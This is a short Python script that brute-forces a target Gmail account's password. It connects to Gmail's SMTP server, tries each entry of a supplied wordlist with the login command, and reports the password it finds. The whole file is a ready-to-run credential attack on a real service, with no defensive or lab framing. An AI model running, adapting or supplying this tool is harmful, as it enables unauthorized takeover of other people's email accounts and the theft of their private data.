#!/usr/bin/env python3

import smtplib as sl
import optparse

try:
	def get_arguments():
		parser = optparse.OptionParser()
		parser.add_option("-g", "--gmail", dest="gmail", help="Target @gmail.com address.")
		parser.add_option("-w", "--wordlist", dest="wordlist", help="Wordlist for bruteforce.")
		(options, arguments) = parser.parse_args()
		if not options.gmail:
			parser.error("[!] Please specify a gmail address, use --help for more info.")
		elif not options.wordlist:
			parser.error("[!] Please specify an wordlist path, use --help for more info.")
		return options
	
	def brute_force(gmail, wordlist):
		try:
			wordlist = open(wordlist, "r")
		except Exception:
			print ("[!] Wordlist not found.")
			exit()
		
		print(f"[*] Trying to bruteforce {gmail}")
		for password in wordlist:
			password = password.rstrip("\n")
			try:
				server.login(gmail, password)
				print(f"[+] Found! Password for {gmail} is: {password}")
				server.quit()
				break
			except sl.SMTPAuthenticationError:
				print(f"[-] Wrong Password: {password}")
			except sl.SMTPConnectError:
				print("[!] Host connection error.")
				exit()
			except sl.SMTPServerDisconnected:
				print("[!] The server unexpectedly disconnects.")
				exit()
	
	options = get_arguments()
				
	server = sl.SMTP ("smtp.gmail.com", 587)
	#server.set_debuglevel(True)
	server.ehlo()
	server.starttls()
		
	brute_force(options.gmail, options.wordlist)
	
except KeyboardInterrupt:
	print("\b\b[!] Closing the application.")
	exit()
